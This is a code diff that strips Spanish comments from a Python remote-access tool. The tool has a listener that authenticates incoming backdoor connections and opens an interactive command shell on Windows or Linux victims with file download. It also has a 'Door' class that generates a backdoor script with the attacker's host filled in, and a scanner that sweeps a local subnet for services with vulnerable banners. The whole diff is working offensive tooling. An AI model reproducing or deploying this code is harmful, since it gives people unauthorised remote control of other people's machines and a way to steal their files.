@@ -22,20 +22,20 @@ class Control:
 				self.conn.listen(1)
 				conex,adrr = self.conn.accept()
 				print('[o]Establishing Connection...')
-				recept = conex.recv(4096) # recibo confirmacion de conexión # opcional
-				print(recept.decode('utf-8')+"with {0}".format(adrr)) # imprimir confirmacion de conexion con direccion, (opcional).
-				self.authenticate(conex) # enviar conex como argumento
+				recept = conex.recv(4096) 
+				print(recept.decode('utf-8')+"with {0}".format(adrr)) 
+				self.authenticate(conex) 
 			except:
-				self.error_count+=1 # contador de errores para evitar que se quede atrapado sin impedir que intente multiples veces.  
-				if self.error_count == 1: # enviando mensaje de espera al primer error
+				self.error_count+=1 
+				if self.error_count == 1: 
 					print("\nTrying, Please wait...") 
-				if self.error_count == 91: # al tener muchos intentos errados se rompe el ciclo.  
+				if self.error_count == 91:  
 					print("\nError in connection method ")
 					break
 				pass
 
 
-	def authenticate(self, conex): # recibir parametro conex en el argumento tambien nombrado 'conex'
+	def authenticate(self, conex): 
 		local_key = self.key
 		key_recv = conex.recv(8)
 		if local_key == key_recv.decode('utf-8'):
@@ -43,43 +43,43 @@ class Control:
 			while 1:
 				sistema_o = input("\n[Menu] Connection with: 1)Windows - 2)Linux : ")
 				if sistema_o == "1":
-					self.console1(conex) # eviando el parametro conex
-				elif sistema_o == "2": # pendiente
-					self.console2(conex) # eviando el parametro conex
+					self.console1(conex) 
+				elif sistema_o == "2": 
+					self.console2(conex) 
 				else:
 					print("Choose only the menu options please.")
 
 
-	def console1(self, conex): # recibir parametro conex en el argumento del mismo nombre
+	def console1(self, conex): 
 		"""Connection with windows"""
-		while 1: # reiniciar el proceso para usar un nuevo comando
+		while 1: 
 			try:
-				while 1: # Repetir si terminal es vacio o es un espacio
+				while 1: 
 					terminal = input('---°')
 					if terminal != "" and not terminal.startswith(" "):	
-						conex.send(terminal.encode()) # enviar convertido a bytes
+						conex.send(terminal.encode()) 
 						break
 
-				if terminal.startswith('download '): # si terminal inicia con 'download ' iniciar proceso de descarga
+				if terminal.startswith('download '): 
 						directory_file = input ('Write directory and name of file: ')
 						with open(directory_file, 'wb') as create_file:
-							conex.send('ok'.encode()) # confirmar que el archivo ya se creo y esta listo para escribir 
-							size_bytes= conex.recv(1024).decode() # recibir tamaño de archivo
+							conex.send('ok'.encode()) 
+							size_bytes= conex.recv(1024).decode() 
 							print('Size of the file you expect to receive:', size_bytes)
-							count_bytes=0 # inicializar var como int
+							count_bytes=0 
 							while 1:	
-								if count_bytes == int(size_bytes): # esperar mensaje de confirmacion de envio total 'end' para terminar el ciclo.
+								if count_bytes == int(size_bytes): 
 									print('\n[o]Download succesfull')
-									conex.send(b'end') # enviar autorizacion para finalizar el proceso de descarga.
+									conex.send(b'end') 
 									break
-								recept_bytes = conex.recv(4096) # recibir bytes del archivo
+								recept_bytes = conex.recv(4096) 
 								create_file.write(recept_bytes)
-								count_bytes= count_bytes+len(recept_bytes) # contar y almacenar la cantidad de bytes recibidos para compararlos con los bytes esperados.
-								sys.stdout.write('\rDownloaded bytes '+str(count_bytes)) # imprimir datos descargados y sobrescribirlos
+								count_bytes= count_bytes+len(recept_bytes) 
+								sys.stdout.write('\rDownloaded bytes '+str(count_bytes)) 
 				while True:
-					back_output = conex.recv(4096).decode('cp850') # 'cp850' decodifica mejor los bytes que proceden del cmd de Windows.
-					if not back_output == '*|*': # de llegar el simbolo de este string, se rompe el ciclo
-						print(back_output) # imprimir salida del bufer
+					back_output = conex.recv(4096).decode('cp850') 
+					if not back_output == '*|*': 
+						print(back_output) 
 					else:
 						break 
 			except KeyboardInterrupt:
@@ -87,35 +87,35 @@ class Control:
 				self.server.close()
 
 
-	def console2(self, conex): # recibir parametro conex en el argumento del mismo nombre
+	def console2(self, conex): 
 		"""Connection with Linux"""
-		while 1: # reiniciar el proceso para usar un nuevo comando
+		while 1: 
 			try:
-				while 1: # Repetir si terminal es vacio o es un espacio
+				while 1: 
 					terminal = input('---°')
 					if terminal != "" and not terminal.startswith(" "):	
-						conex.send(terminal.encode()) # enviar convertido a bytes
+						conex.send(terminal.encode()) 
 						break
-				if terminal.startswith('download '): # si terminal inicia con 'download ' iniciar proceso de descarga
+				if terminal.startswith('download '): 
 						directory_file = input ('Write directory and name of file: ')
 						with open(directory_file, 'wb') as create_file:
-							conex.send('ok'.encode()) # confirmar que el archivo ya se creo y esta listo para escribir 
-							size_bytes= conex.recv(1024).decode() # recibir tamaño de archivo
+							conex.send('ok'.encode()) 
+							size_bytes= conex.recv(1024).decode() 
 							print('Size of the file you expect to receive:', size_bytes)
-							count_bytes=0 # inicializar var como int
+							count_bytes=0 
 							while 1:	
-								if count_bytes == int(size_bytes): # esperar mensaje de confirmacion de envio total 'end' para terminar el ciclo.
+								if count_bytes == int(size_bytes): 
 									print('\n[o]Download succesfull')
-									conex.send(b'end') # enviar autorizacion para finalizar el proceso de descarga.
+									conex.send(b'end') 
 									break
-								recept_bytes = conex.recv(4096) # recibir bytes del archivo
+								recept_bytes = conex.recv(4096) 
 								create_file.write(recept_bytes)
-								count_bytes= count_bytes+len(recept_bytes) # contar y almacenar la cantidad de bytes recibidos para compararlos con los bytes esperados.
-								sys.stdout.write('\rDownloaded bytes '+str(count_bytes)) # imprimir datos descargados y sobrescribirlos
+								count_bytes= count_bytes+len(recept_bytes) 
+								sys.stdout.write('\rDownloaded bytes '+str(count_bytes)) 
 				while True:
-					back_output = conex.recv(4096).decode('utf-8', 'surrogateescape') # 'utf-8', 'surrogateescape' decodifica mejor los bytes que proceden de la terminal Linux.
-					if not back_output == '*|*': # de llegar el simbolo de este string, se rompe el ciclo
-						print(back_output) # imprimir salida del bufer
+					back_output = conex.recv(4096).decode('utf-8', 'surrogateescape') 
+					if not back_output == '*|*': 
+						print(back_output) 
 					else:
 						break 
 			except KeyboardInterrupt:
@@ -128,42 +128,42 @@ class Door():
 	"""Generate back door"""
 	def g_door(self, set_host, set_dir):
 		Local_host = set_host
-		with open('backx.py', 'rb') as f: # Abrir archivo en formato lectura bytes
+		with open('backx.py', 'rb') as f: 
 			read_f = f.read()   
-			print(re.search(r'###localhost###', read_f.decode('utf-8'))) # >Temporal
-			substitution = re.sub(r'###localhost###', Local_host, read_f.decode('utf-8')) # Sustituir fragmento de texto especificado por la variable 'Local_host' en el archivo leido pero decodificado.
-			print(substitution) # >Temporal
-			w_dir = set_dir #input('Write the directory and the name of the door to create:\n<write>> ') # Escribir ruta y nombre del archivo a crear
-			dir_f = w_dir +'.py' # concatenar la ruta y el nombre con la extencion '.py'
-			create_f = open(dir_f, 'wb') # crear archivo usando la variable concatenada y en formato escritura bytes
+			print(re.search(r'###localhost###', read_f.decode('utf-8'))) 
+			substitution = re.sub(r'###localhost###', Local_host, read_f.decode('utf-8')) 
+			print(substitution) 
+			w_dir = set_dir 
+			dir_f = w_dir +'.py' 
+			create_f = open(dir_f, 'wb') 
 			create_f.write(substitution.encode())
-			create_f.close() # Cerrar archivo para que se pueda usar sin finalizar este script
+			create_f.close() 
 
   
 class BannerScann():
 
 	"""Set target port\s and vuln banner\s"""
-	def __init__(self, set_ports, set_vul): # set_ports, set_vulnb
-		self.ports = set_ports #open('ports.txt', 'r')
-		self.vulnbann= set_vul #open('vulbanners.txt', 'r')
+	def __init__(self, set_ports, set_vul): 
+		self.ports = set_ports 
+		self.vulnbann= set_vul 
 	
-	def convert(self): # Para trabajarlos correctamente hay que convertir los puertos y vuln banners a lista.
+	def convert(self): 
 		"""Convert Ports"""
 		list_ports = []
 		list_vul = []
-		if type(self.ports) is list: # si es una lista es correcto
+		if type(self.ports) is list: 
 			list_ports = self.ports
-		elif type(self.ports) is int: # si es un entero, se convierte en lista para que sea iterable			
+		elif type(self.ports) is int: 			
 			list_ports.append(self.ports) 	
-		else: # Si es algo iterable pero no es una lista, se itera para convertirlo en una lista.
+		else: 
 			for i in self.ports: 
 				list_ports.append(i.strip())
 		"""Convert vulnbanners"""
-		if type(self.vulnbann) is list: # si es una lista es correcto
+		if type(self.vulnbann) is list: 
 				list_vul = self.vulnbann
-		else: # Si es algo iterable pero no es una lista, se itera para convertirlo en una lista (archivo txt).
+		else: 
 			for j in self.vulnbann: 
-				list_vul.append(j.strip()) # eliminar caracteres de escape con append
+				list_vul.append(j.strip()) 
 		return list_ports,list_vul
 	
 	def traking(self, rang1, rang2):
@@ -177,18 +177,18 @@ class BannerScann():
 			print(private_host)
 			for target_port in use_ports:
 				print('puesrto iterado:',target_port)
-				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creando objeto sock
+				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 				try:
-					sock.connect(('192.168.1.'+str(private_host), int(target_port) )) # Conectandose estableciendo host(servidor) y puerto(servicio). 
+					sock.connect(('192.168.1.'+str(private_host), int(target_port) )) 
 					sock.settimeout(1)
-					get_banner = sock.recv(512).decode('utf-8') # respuesta del servidor
+					get_banner = sock.recv(512).decode('utf-8') 
 					for b_vulnn in use_vul:
-						if get_banner.strip() == b_vulnn.strip(): # strip para operar los string obtenidos sin caracteres de escape.
+						if get_banner.strip() == b_vulnn.strip(): 
 							 print('\nA vulnerability was found in:\n\n', 
 							 	   'HOST ->', private_host,
 							 	   '\n PORT ->',target_port,
 							       '\n Vulnerable service ->',get_banner)
-					sock.close() # Para que no interfiera con la conexion en el siguiente puerto anlizado.
+					sock.close() 
 				except Exception as e:
 					print('STDERR=>', e)
 				
